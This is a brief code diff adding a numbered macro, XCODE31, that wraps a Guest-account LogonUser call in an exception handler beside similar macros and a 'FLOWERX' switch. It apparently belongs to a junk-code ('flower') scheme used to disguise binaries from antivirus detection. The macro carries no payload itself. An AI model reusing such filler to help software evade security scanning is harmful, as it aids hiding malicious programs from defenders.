@@ -938,6 +938,12 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 	Sleep(30);\
 }
 
+#define XCODE31 __try{\
+::LogonUser("Guest", "localhost", "", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken);\
+}\
+	__except(EXCEPTION_EXECUTE_HANDLER){\
+	Sleep(31);\
+}
 #ifdef FLOWERX
 #include "xrand.h"
 #else
